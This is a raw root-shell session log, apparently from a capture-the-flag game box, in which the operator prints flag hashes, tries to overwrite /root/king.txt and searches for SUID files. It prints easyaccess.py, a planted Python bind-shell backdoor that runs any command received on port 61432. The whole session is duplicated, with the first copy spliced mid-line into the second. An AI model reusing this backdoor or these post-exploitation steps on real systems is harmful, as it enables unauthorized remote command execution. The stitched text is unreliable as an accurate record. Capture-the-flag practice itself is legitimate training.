/bin/sh: 0: can't access tty; job control turned off
# ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
# whoami
root
# ls root
king.txt
root.txt
# nano king.txt
Error opening terminal: unknown.
# echo "gneal1" >> root/king.txt
/bin/sh: 5: cannot create root/king.txt: Permission denied
# cat root/king.txt
M3chanical
# cat root.txt
cat: root.txt: No such file or directory
# cat root/root.txt
218f5ea7a4d711eef60171e5c92ba9e1
# echo "gneal1" >> root.king.txt
# echo "gneal1" >> root/king.txt
/bin/sh: 10: cannot create root/king.txt: Permission denied
# ls hoome
ls: cannot access 'hoome': No such file or directory
# ls home
bunny
jordan
# cd home/bunny
# ls
2hSn.log
bin
config.json
pids
simple-command-injection
sock
user.txt
vyqj.log
# cat user.txt
79973eb57d0188ffc6c85a1a4e57a516
# cat simple-command-injection
cat: simple-command-injection: Is a directory
# ls simple-command-injection
example.py
node_modules
script.py
script.sh
server.js
# ls
2hSn.log
bin
config.json
pids
simple-command-injection
sock
user.txt
vyqj.log
# cd ..
# ls
bunny
jordan
# cd jordan
# ls
easyaccess.py
user.txt
# cat user.txt
79973eb57d0188ffc6c85a1a4e57a516
# cat easyaccess.py
#!/usr/bin/env python3

import socket
import os

HOST = '0.0.0.0' 
PORT = 61432    

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024).decode("utf-8")
            output = os.popen(str(data)).read()
            cmd = str.encode(output)
            if not data:
                break
            conn.sendall(cmd)

# ls /root
king.txt
root.txt
# ls -la /root
total 56
drwx------  7 root root 4096 Apr  4  2020 .
drwxr-xr-x 23 root root 4096 Nov 14 17:41 ..
lrwxrwxrwx  1 root root    9 Feb 25  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Mar  4  2020 .cache
drwx------  3 root root 4096 Mar  4  2020 .config
drwxrwxrwx  2 root root 4096 Mar  4  2020 .forever
-rw-r--r--  1 root root   11 Nov 14 17:32 king.txt
lrwxrwxrwx  1 root root    9 Feb 25  2020 .mysql_history -> /dev/null
drwxr-xr-x  2 root root 4096 Mar  4  2020 .nano
drwxr-xr-x  4 root root 4096 Mar  4  2020 .npm
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Feb 25  2020 root.txt
-rw-r--r--  1 root root   66 Apr  4  2020 .selected_editor
-rw-------  1 root root 7645 Apr  4  2020 .viminfo
# find / -perm 2000 2>=/dev/null
/bin/sh: 27: cannot create =/dev/null: Directory nonexistent
# less king.txt
king.txt: No such file or directory
# find / -perm 2000 2>/dev/null
# find / -perm 4000 2>/dev/null/bin/sh: 0: can't access tty; job control turned off
# ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
# whoami
root
# ls root
king.txt
root.txt
# nano king.txt
Error opening terminal: unknown.
# echo "gneal1" >> root/king.txt
/bin/sh: 5: cannot create root/king.txt: Permission denied
# cat root/king.txt
M3chanical
# cat root.txt
cat: root.txt: No such file or directory
# cat root/root.txt
218f5ea7a4d711eef60171e5c92ba9e1
# echo "gneal1" >> root.king.txt
# echo "gneal1" >> root/king.txt
/bin/sh: 10: cannot create root/king.txt: Permission denied
# ls hoome
ls: cannot access 'hoome': No such file or directory
# ls home
bunny
jordan
# cd home/bunny
# ls
2hSn.log
bin
config.json
pids
simple-command-injection
sock
user.txt
vyqj.log
# cat user.txt
79973eb57d0188ffc6c85a1a4e57a516
# cat simple-command-injection
cat: simple-command-injection: Is a directory
# ls simple-command-injection
example.py
node_modules
script.py
script.sh
server.js
# ls
2hSn.log
bin
config.json
pids
simple-command-injection
sock
user.txt
vyqj.log
# cd ..
# ls
bunny
jordan
# cd jordan
# ls
easyaccess.py
user.txt
# cat user.txt
79973eb57d0188ffc6c85a1a4e57a516
# cat easyaccess.py
#!/usr/bin/env python3

import socket
import os

HOST = '0.0.0.0' 
PORT = 61432    

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024).decode("utf-8")
            output = os.popen(str(data)).read()
            cmd = str.encode(output)
            if not data:
                break
            conn.sendall(cmd)

# ls /root
king.txt
root.txt
# ls -la /root
total 56
drwx------  7 root root 4096 Apr  4  2020 .
drwxr-xr-x 23 root root 4096 Nov 14 17:41 ..
lrwxrwxrwx  1 root root    9 Feb 25  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Mar  4  2020 .cache
drwx------  3 root root 4096 Mar  4  2020 .config
drwxrwxrwx  2 root root 4096 Mar  4  2020 .forever
-rw-r--r--  1 root root   11 Nov 14 17:32 king.txt
lrwxrwxrwx  1 root root    9 Feb 25  2020 .mysql_history -> /dev/null
drwxr-xr-x  2 root root 4096 Mar  4  2020 .nano
drwxr-xr-x  4 root root 4096 Mar  4  2020 .npm
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Feb 25  2020 root.txt
-rw-r--r--  1 root root   66 Apr  4  2020 .selected_editor
-rw-------  1 root root 7645 Apr  4  2020 .viminfo
# find / -perm 2000 2>=/dev/null
/bin/sh: 27: cannot create =/dev/null: Directory nonexistent
# less king.txt
king.txt: No such file or directory
# find / -perm 2000 2>/dev/null
# find / -perm 4000 2>/dev/null
# 